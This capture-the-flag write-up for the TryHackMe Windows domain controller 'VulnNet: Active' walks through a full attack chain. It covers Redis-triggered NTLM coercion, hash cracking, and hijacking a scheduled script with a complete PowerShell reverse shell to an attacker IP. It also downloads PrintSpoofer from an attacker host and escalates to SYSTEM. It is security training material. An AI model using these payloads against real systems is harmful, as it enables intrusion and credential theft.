# VulnNet: Active - TryHackMe

> **Kill Chain Summary**:
> Network Reconnaissance (DNS 53, SMB 445, Redis 6379) -> Windows Domain Controller Identification (`VULNNET`) -> Unauthenticated Redis Access -> Forcing SMB Authentication via UNC Path Configuration (`CONFIG SET dir`) -> NetNTLMv2 Hash Capture with Responder -> Offline Cracking with Hashcat (mode 5600) -> Authenticated SMB Access (`Enterprise-Share`) -> Scheduled Task Script Hijacking (`PurgeIrrelevantData_1826.ps1`) -> Reverse Shell as `vulnnet\enterprise-security` -> Privilege Audit (`SeImpersonatePrivilege Enabled`) -> Token Impersonation via PrintSpoofer / GodPotato -> System Shell (`NT AUTHORITY\SYSTEM`).

| Property | Value |
| :--- | :--- |
| **Target Name** | VulnNet: Active |
| **Platform** | TryHackMe |
| **OS** | Windows Server (Domain Controller) |
| **Difficulty** | Medium |
| **Status** | Rooted |
| **Key Techniques** | Redis Enumeration, Responder NTLMv2 Coercion, NetNTLMv2 Cracking (Hashcat), SMB Script Hijacking, SeImpersonatePrivilege Token Impersonation |

---

## 1. Reconnaissance and Enumeration

### 1.1 Port Scanning

A full TCP port scan was performed using Nmap:

```bash
sudo nmap -sC -sV -p- -T4 -oA nmap/full_tcp_10.10.160.75 10.10.160.75
```

**Open Ports:**

| Port | Service | Notes |
| :--- | :--- | :--- |
| 53/tcp | DNS | Microsoft DNS |
| 135/tcp | MSRPC | Microsoft RPC endpoint mapper |
| 139/445/tcp | SMB | Microsoft-DS (Domain Controller) |
| 464/tcp | kpasswd5 | Kerberos password change service |
| 6379/tcp | Redis | Redis 2.8.2402 on Windows (Unauthenticated) |
| 9389/tcp | .NET | Active Directory Web Services (ADWS) |

Enumerating NetBIOS domain details using `enum4linux`:

```bash
enum4linux -a 10.10.160.75
```

```text
Domain Name: VULNNET
OS: Windows Server (Active Directory Domain Controller)
```

Null session authentication to RPC and SMB is blocked (`NT_STATUS_ACCESS_DENIED`). The exposed Redis service on port 6379 represents the primary unauthenticated vector.

---

## 2. Initial Access

### 2.1 Forcing NTLM Authentication via Redis

Connecting to the Redis instance without credentials:

```bash
redis-cli -h 10.10.160.75
```

Standard Linux Redis exploitation vectors (such as writing an SSH public key or Apache web shell) do not apply to Windows hosts. However, Windows attempts automatic NTLM authentication whenever a process accesses an SMB Universal Naming Convention (UNC) path (`\\<HOST>\<SHARE>`).

#### Step 1: Start Responder
Start Responder on the attack machine listening on the VPN interface (`tun0`):

```bash
sudo responder -I tun0 -v
```

#### Step 2: Trigger UNC Path Access from Redis
Instruct Redis to change its working directory and database file location to a remote UNC path pointing back to the Kali machine:

```text
10.10.160.75:6379> CONFIG SET dir \\10.10.14.5\share
OK
10.10.160.75:6379> CONFIG SET dbfilename backup.rdb
OK
10.10.160.75:6379> SAVE
(error) ERR DB backup error
```

Even though the database save fails due to filesystem permissions, Windows initiates an outbound SMB connection to validate the UNC path.

#### Step 3: Capture NetNTLMv2 Hash
Responder intercepts the authentication handshake and captures the user's NetNTLMv2 hash:

```text
[SMB] NTLMv2-SSP Username : VULNNET\enterprise-security
[SMB] NTLMv2-SSP Hash     : enterprise-security::VULNNET:1122334455667788:...
```

### 2.2 Cracking NetNTLMv2 Hash

Save the hash to `hash.txt` and crack it using Hashcat mode 5600:

```bash
hashcat -m 5600 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

```text
enterprise-security::VULNNET:...:sand_0873959498
```

Recovered credentials:
- **Username:** `enterprise-security`
- **Password:** `sand_0873959498`

---

## 3. Privilege Escalation

WinRM (port 5985) is not open on the host. Using the recovered credentials to enumerate SMB shares:

```bash
smbclient -L //10.10.160.75/ -U enterprise-security
```

```text
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Enterprise-Share Disk     
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
```

Connecting to `Enterprise-Share`:

```bash
smbclient //10.10.160.75/Enterprise-Share -U enterprise-security
smb: \> ls
  PurgeIrrelevantData_1826.ps1        A      182  Mon Jul  6 12:44:10 2020
```

The share contains a PowerShell script named `PurgeIrrelevantData_1826.ps1`. The file is periodically invoked by a scheduled task running in the user's security context.

### 3.1 Weaponizing the Script

Create a PowerShell reverse shell locally:

```powershell
$client = New-Object System.Net.Sockets.TCPClient("10.10.14.5",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

Save the script as `PurgeIrrelevantData_1826.ps1` and overwrite the target file on the SMB share:

```bash
smbclient //10.10.160.75/Enterprise-Share -U enterprise-security -c "put PurgeIrrelevantData_1826.ps1"
```

Start a Netcat listener on port 4444:

```bash
nc -lvnp 4444
```

When the scheduled task executes, the reverse shell connects back to the listener:

```text
listening on [any] 4444 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.160.75] 51832
PS C:\Windows\system32> whoami
vulnnet\enterprise-security
```

Retrieve the user flag:

```powershell
type C:\Users\enterprise-security\Desktop\user.txt
```

```text
[FLAG REDACTED]
```

---

### Privilege Escalation

### 4.1 Token Privilege Audit

Checking token privileges assigned to `vulnnet\enterprise-security`:

```powershell
whoami /priv
```

```text
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
```

`SeImpersonatePrivilege` is enabled on the domain service account.

### 4.2 Exploitation via PrintSpoofer or GodPotato

Because the account possesses `SeImpersonatePrivilege`, either **PrintSpoofer** or **GodPotato** can be deployed to elevate to `NT AUTHORITY\SYSTEM`.

#### Staging Payloads via SMB
Stage `PrintSpoofer64.exe` through the existing writable SMB share or fetch it via PowerShell:

```powershell
powershell -c "(New-Object Net.WebClient).DownloadFile('http://10.10.14.5:8000/PrintSpoofer64.exe', 'C:\Windows\Temp\PrintSpoofer.exe')"
```

Execute PrintSpoofer to spawn an elevated command shell:

```cmd
C:\Windows\Temp\PrintSpoofer.exe -i -c cmd
```

```text
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
C:\Windows\system32> whoami
nt authority\system
```

Retrieve the root flag:

```cmd
type C:\Users\Administrator\Desktop\root.txt
```

```text
[FLAG REDACTED]
```

---

## 4. Useful Commands Summary

```bash
# Force NTLM Authentication via Redis UNC Path
redis-cli -h <TARGET_IP> CONFIG SET dir \\\\<KALI_IP>\\share
redis-cli -h <TARGET_IP> CONFIG SET dbfilename dump.rdb
redis-cli -h <TARGET_IP> SAVE

# Crack NetNTLMv2 Hashes
hashcat -m 5600 -a 0 <HASH_FILE> <WORDLIST>

# Overwrite Scheduled SMB Script
smbclient //<TARGET_IP>/<SHARE> -U <USER> -c "put <PAYLOAD_FILE>"

# Elevate Privileges via PrintSpoofer
PrintSpoofer.exe -i -c cmd
```

---

## 5. Key Takeaways and Lessons Learned

1. **NTLM Coercion via Redis:** Redis instances hosted on Windows platforms do not support Linux file injection techniques. However, directing file operations to UNC paths (`\\<IP>\path`) forces the operating system to perform an SMB handshake, enabling NetNTLMv2 hash capture.
2. **Scheduled Task Script Replacement:** Writable shares that contain active administrative scripts (`.ps1`, `.bat`, `.vbs`) indicate scheduled execution. Overwriting these scripts provides dependable command execution under the account running the task.
3. **Alternative Windows File Transfers:** If `certutil` fails or is blocked by endpoint detection, leverage authenticated SMB shares, PowerShell `Net.WebClient`, or direct SMB copy operations (`copy \\<IP>\<share>\file`) as robust alternatives.

---

#tryhackme #windows #active-directory #redis #responder #ntlmv2 #hashcat #smb #script-hijacking #seimpersonate #printspoofer #privesc
